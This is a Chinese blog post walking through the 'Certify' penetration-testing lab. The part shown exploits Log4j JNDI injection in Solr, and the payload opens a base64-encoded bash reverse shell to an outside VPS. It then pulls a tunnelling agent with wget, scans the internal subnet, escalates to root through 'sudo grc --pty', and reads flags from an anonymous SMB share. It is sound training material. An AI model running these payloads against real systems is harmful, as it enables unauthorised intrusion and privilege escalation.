<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>certify | 仙心</title><meta name="author" content="xianxin"><meta name="copyright" content="xianxin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CertifyCertify是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。 tagSolr RCE、AD CS、SMB、Kerberos、域渗透 信息收集.&#x2F;fscan.exe -h 39.98.107.1">
<meta property="og:type" content="article">
<meta property="og:title" content="certify">
<meta property="og:url" content="https://xianxinyyds.github.io/2025/08/13/certify/index.html">
<meta property="og:site_name" content="仙心">
<meta property="og:description" content="CertifyCertify是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。 tagSolr RCE、AD CS、SMB、Kerberos、域渗透 信息收集.&#x2F;fscan.exe -h 39.98.107.1">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://xianxinyyds.github.io/img/xianxin.jpg">
<meta property="article:published_time" content="2025-08-13T15:28:29.000Z">
<meta property="article:modified_time" content="2025-08-30T08:29:17.004Z">
<meta property="article:author" content="xianxin">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://xianxinyyds.github.io/img/xianxin.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "certify",
  "url": "https://xianxinyyds.github.io/2025/08/13/certify/",
  "image": "https://xianxinyyds.github.io/img/xianxin.jpg",
  "datePublished": "2025-08-13T15:28:29.000Z",
  "dateModified": "2025-08-30T08:29:17.004Z",
  "author": [
    {
      "@type": "Person",
      "name": "xianxin",
      "url": "https://xianxinyyds.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/xianxin.jpg"><link rel="canonical" href="https://xianxinyyds.github.io/2025/08/13/certify/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'certify',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/456.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/xianxin.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/147.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/xianxin.jpg" alt="Logo"><span class="site-name">仙心</span></a><a class="nav-page-title" href="/"><span class="site-name">certify</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">certify</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-13T15:28:29.000Z" title="发表于 2025-08-13 23:28:29">2025-08-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-08-30T08:29:17.004Z" title="更新于 2025-08-30 16:29:17">2025-08-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>24分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Certify"><a href="#Certify" class="headerlink" title="Certify"></a>Certify</h1><p>Certify是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。</p>
<h2 id="tag"><a href="#tag" class="headerlink" title="tag"></a>tag</h2><p><code>Solr RCE</code>、<code>AD CS</code>、<code>SMB</code>、<code>Kerberos</code>、<code>域渗透</code></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><code>./fscan.exe -h 39.98.107.120 -nobr</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">39.98.107.120:80 open</span><br><span class="line">39.98.107.120:22 open</span><br><span class="line">39.98.107.120:8983 open</span><br><span class="line">[*] alive ports len is: 3</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.98.107.120      code:200 len:612    title:Welcome to nginx!</span><br><span class="line">[*] WebTitle http://39.98.107.120:8983 code:302 len:0      title:None 跳转url: http://39.98.107.120:8983/solr/</span><br><span class="line">[*] WebTitle http://39.98.107.120:8983/solr/ code:200 len:16555  title:Solr Admin</span><br><span class="line">已完成 3/3</span><br><span class="line">[*] 扫描结束,耗时: 9.8474042s</span><br></pre></td></tr></table></figure>
<h2 id="机器19"><a href="#机器19" class="headerlink" title="机器19"></a>机器19</h2><p>登上去<code>http://39.98.107.120:8983/solr/</code>发现solr版本为8.11.0，版本较高，搜索后大部分相关的CVE都被修复</p>
<blockquote>
<p>Versions   solr-spec   8.11.0</p>
</blockquote>
<p>尝试利用CVE-2021-44228 (Log4j) 影响Solr</p>
<blockquote>
<p>根据官方公告，Solr 8.11.0使用的Log4j版本为2.14.1（受Log4j漏洞影响），但需要特定配置才能触发。<br>Args里面也有<br>-Dlog4j.configurationFile&#x3D;&#x2F;var&#x2F;solr&#x2F;log4j2.xml</p>
</blockquote>
<p>先测试一下对方服务器是否会访问我们输入的网址，这里利用<code>/solr/admin/cores</code>路径下的action参数进行JNDI 注入<br><img src="https://cdn.jsdelivr.net/gh/xianxinyyds/tuchuang@main/img/QQ_1755087185584.png"><br><code>/solr/admin/cores?action=$&#123;jndi:ldap://ydhthi.dnslog.cn&#125;</code><br><img src="https://cdn.jsdelivr.net/gh/xianxinyyds/tuchuang@main/img/QQ_1755003857261.png"><br>在dnslog成功接收到，说明访问该路由可以让对方访问我们的网址，这里利用rogue-jndi进行注入<br>在vps上操作<br><code>git clone https://github.com/veracode-research/rogue-jndi</code><br><code>cd rogue-jndi</code><br><code>mvn package</code><br><code>echo &#39;bash -c bash -i &gt;&amp;/dev/tcp/129.211.219.46/4444 0&gt;&amp;1&#39; | base64</code><br><code>java -jar target/RogueJndi-1.1.jar --command &quot;bash -c &#123;echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTI5LjIxMS4yMTkuNDYvNDQ0NCAwPiYxCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; --hostname &quot;129.211.219.46&quot; </code><br><code>nc -lvnp 4444</code><br><img src="https://cdn.jsdelivr.net/gh/xianxinyyds/tuchuang@main/img/QQ_1755087817515.png"><br>这里这个工具需要选择模式</p>
<blockquote>
<p>LDAP URL路径	对应的控制器类	适用目标中间件&#x2F;场景<br>o&#x3D;websphere1	artsploit.controllers.WebSphere1	IBM WebSphere应用服务器<br>o&#x3D;websphere1,wsdl&#x3D;*	artsploit.controllers.WebSphere1	同上（带wsdl参数的变体）<br>&#x2F; 或 o&#x3D;reference	artsploit.controllers.RemoteReference	通用Java应用（RMI远程引用）<br>o&#x3D;websphere2	artsploit.controllers.WebSphere2	WebSphere的另一种攻击载荷<br>o&#x3D;websphere2,jar&#x3D;*	artsploit.controllers.WebSphere2	同上（带jar参数的变体）<br>o&#x3D;groovy	artsploit.controllers.Groovy	Groovy环境的应用<br>o&#x3D;tomcat	artsploit.controllers.Tomcat	Apache Tomcat服务器</p>
</blockquote>
<p>传入参数为<code>$&#123;jndi:ldap://129.211.219.46:1389/o=reference&#125;</code><br><code>/solr/admin/cores?action=$&#123;jndi:ldap://129.211.219.46:1389/o=reference&#125;</code><br>成功反弹到shell，然后传个stowaway上去，进行连接<br>在VPS上起个python内置服务器:<br>把需要下载的文件放在你执行python命令的路径下，然后执行下面的命令<br><code>python3 -m http.server 80</code><br>然后在对方机器shell中进行下载，输入下面的命令即可，这里的ip为我们的vps的外网地址，路径为文件名<br><code>wget http://129.211.219.46/linux_x64_agent</code><br>如果不行可以试试ping一下，ping通了就是能下，可能是文件名错了之类的<br><code>./linux_x64_agent -l 44444 -s 123</code><br><code>./linux_x64_admin -c 39.98.107.120:44444 -s 123</code><br>成功连接，先用stowaway传个fscan上去<br><code>upload /home/kali/Desktop/fscan /tmp/fscan</code><br>挂个代理<br><code>socks 12345</code><br>然后起shell<br><code>shell</code><br><code>ifconfig</code><br><code>./fscan -h 172.22.9.0/24 -nobr</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.9.19     is alive</span><br><span class="line">(icmp) Target 172.22.9.7      is alive</span><br><span class="line">(icmp) Target 172.22.9.26     is alive</span><br><span class="line">(icmp) Target 172.22.9.47     is alive</span><br><span class="line">172.22.9.7:80 open</span><br><span class="line">172.22.9.47:80 open</span><br><span class="line">172.22.9.19:80 open</span><br><span class="line">172.22.9.19:22 open</span><br><span class="line">172.22.9.47:22 open</span><br><span class="line">172.22.9.47:21 open</span><br><span class="line">172.22.9.19:8983 open</span><br><span class="line">172.22.9.7:88 open</span><br><span class="line">172.22.9.26:445 open</span><br><span class="line">172.22.9.47:445 open</span><br><span class="line">172.22.9.7:445 open</span><br><span class="line">172.22.9.26:139 open</span><br><span class="line">172.22.9.47:139 open</span><br><span class="line">172.22.9.7:139 open</span><br><span class="line">172.22.9.26:135 open</span><br><span class="line">172.22.9.7:135 open</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.9.26</span><br><span class="line">   [-&gt;]DESKTOP-CBKTVMO</span><br><span class="line">   [-&gt;]172.22.9.26</span><br><span class="line">[*] NetBios 172.22.9.7      [+] DC:XIAORANG\XIAORANG-DC    </span><br><span class="line">[*] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.9.7</span><br><span class="line">   [-&gt;]XIAORANG-DC</span><br><span class="line">   [-&gt;]172.22.9.7</span><br><span class="line">[*] WebTitle http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] WebTitle http://172.22.9.19        code:200 len:612    title:Welcome to nginx!</span><br><span class="line">[*] OsInfo 172.22.9.47  (Windows 6.1)</span><br><span class="line">[*] NetBios 172.22.9.47     fileserver                          Windows 6.1</span><br><span class="line">[*] WebTitle http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin</span><br><span class="line">[+] PocScan http://172.22.9.7 poc-yaml-active-directory-certsrv-detect </span><br><span class="line">已完成 16/16</span><br><span class="line">[*] 扫描结束,耗时: 9.668617979s</span><br></pre></td></tr></table></figure>
<p>172.22.9.19 本机<br>172.22.9.7 DC域控<br>172.22.9.26<br>172.22.9.47<br>发现并非root权限尝试提权<br>查看suid权限命令发现并没有可利用命令<br><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/stapbpf</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/staprun</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure>
<p>没有比较好利用的命令<br>sudo -l执行后发现可以无密码执行grc命令<br><code>sudo -l</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for solr on ubuntu:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User solr may run the following commands on ubuntu:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/grc</span><br></pre></td></tr></table></figure>
<p>获取命令的帮助界面<br><code>grc</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Generic Colouriser 1.11.3</span><br><span class="line">grc [options] command [args]</span><br><span class="line">Options:</span><br><span class="line">-e --stderr    redirect stderr. If this option is selected,</span><br><span class="line">               do not automatically redirect stdout</span><br><span class="line">-s --stdout    redirect stdout, even if -e is selected</span><br><span class="line">-c name --config=name    use name as configuration file for grcat</span><br><span class="line">--colour=word  word is one of: on, off, auto</span><br><span class="line">--pty          run command in pseudoterminal (experimental)</span><br></pre></td></tr></table></figure>
<p>发现–pty可以直接命令执行，直接提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sudo grc --pty /bin/bash</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">flag</span><br><span class="line">cd flag</span><br><span class="line">ls</span><br><span class="line">flag01.txt</span><br><span class="line">cat flag01.txt</span><br><span class="line">   ██████                   ██   ██   ████         </span><br><span class="line">  ██░░░░██                 ░██  ░░   ░██░   ██   ██</span><br><span class="line"> ██    ░░   █████  ██████ ██████ ██ ██████ ░░██ ██ </span><br><span class="line">░██        ██░░░██░░██░░█░░░██░ ░██░░░██░   ░░███  </span><br><span class="line">░██       ░███████ ░██ ░   ░██  ░██  ░██     ░██   </span><br><span class="line">░░██    ██░██░░░░  ░██     ░██  ░██  ░██     ██    </span><br><span class="line"> ░░██████ ░░██████░███     ░░██ ░██  ░██    ██     </span><br><span class="line">  ░░░░░░   ░░░░░░ ░░░       ░░  ░░   ░░    ░░      </span><br><span class="line"></span><br><span class="line">Easy right?</span><br><span class="line">Maybe you should dig into my core domain network.</span><br><span class="line"></span><br><span class="line">flag01: flag&#123;41e6ca63-ec8a-40c0-8362-5b9eebd62bad&#125;</span><br></pre></td></tr></table></figure>
<h2 id="机器47"><a href="#机器47" class="headerlink" title="机器47"></a>机器47</h2><p>然后进行对其他靶机进行渗透，尝试直接未授权访问47机器fileserver<br><code>proxychains smbclient -L //172.22.9.47/ -N</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[proxychains] config file found: /etc/proxychains.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.9.47:445  ...  OK</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        fileshare       Disk      bill share</span><br><span class="line">        IPC$            IPC       IPC Service (fileserver server (Samba, Ubuntu))</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.9.47:139  ...  OK</span><br><span class="line"></span><br><span class="line">        Server               Comment</span><br><span class="line">        ---------            -------</span><br><span class="line"></span><br><span class="line">        Workgroup            Master</span><br><span class="line">        ---------            -------</span><br><span class="line">        WORKGROUP            FILESERVER</span><br></pre></td></tr></table></figure>
<p><code>proxychains smbclient //172.22.9.47/fileshare -N</code>                                                                                             </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[proxychains] config file found: /etc/proxychains.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.9.47:445  ...  OK</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Wed Jul 13 04:12:10 2022</span><br><span class="line">  ..                                  D        0  Wed Jul 13 00:35:09 2022</span><br><span class="line">  personnel.db                        A    61440  Wed Jul 13 03:46:55 2022</span><br><span class="line">  secret                              D        0  Tue Aug 12 08:11:19 2025</span><br><span class="line">  Certified_Pre-Owned.7z              N  9572925  Wed Jul 13 04:12:03 2022</span><br><span class="line">  Certified_Pre-Owned.pdf             N 10406101  Wed Jul 13 04:08:14 2022</span><br><span class="line"></span><br><span class="line">                41152812 blocks of size 1024. 36032900 blocks available</span><br><span class="line">smb: \&gt; get personnel.db</span><br><span class="line">getting file \personnel.db of size 61440 as personnel.db (487.8 KiloBytes/sec) (average 487.8 KiloBytes/sec)</span><br><span class="line">smb: \&gt; cd secret</span><br><span class="line">smb: \secret\&gt; ls</span><br><span class="line">  .                                   D        0  Tue Aug 12 08:11:19 2025</span><br><span class="line">  ..                                  D        0  Wed Jul 13 04:12:10 2022</span><br><span class="line">  flag02.txt                          N      659  Tue Aug 12 08:11:19 2025</span><br><span class="line"></span><br><span class="line">                41152812 blocks of size 1024. 36032888 blocks available</span><br><span class="line">smb: \secret\&gt; get flag02.txt</span><br><span class="line">getting file \secret\flag02.txt of size 659 as flag02.txt (5.6 KiloBytes/sec) (average 255.9 KiloBytes/sec)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ cat flag02.txt                                       </span><br><span class="line"> ________  _______   ________  _________  ___  ________ ___    ___ </span><br><span class="line">|\   ____\|\  ___ \ |\   __  \|\___   ___\\  \|\  _____\\  \  /  /|</span><br><span class="line">\ \  \___|\ \   __/|\ \  \|\  \|___ \  \_\ \  \ \  \__/\ \  \/  / /</span><br><span class="line"> \ \  \    \ \  \_|/_\ \   _  _\   \ \  \ \ \  \ \   __\\ \    / / </span><br><span class="line">  \ \  \____\ \  \_|\ \ \  \\  \|   \ \  \ \ \  \ \  \_| \/  /  /  </span><br><span class="line">   \ \_______\ \_______\ \__\\ _\    \ \__\ \ \__\ \__\__/  / /    </span><br><span class="line">    \|_______|\|_______|\|__|\|__|    \|__|  \|__|\|__|\___/ /     </span><br><span class="line">                                                      \|___|/      </span><br><span class="line"></span><br><span class="line">flag02: flag&#123;17897269-3c19-49ce-8b20-170731822a64&#125;</span><br><span class="line"></span><br><span class="line">Yes, you have enumerated smb. But do you know what an SPN is?</span><br></pre></td></tr></table></figure>
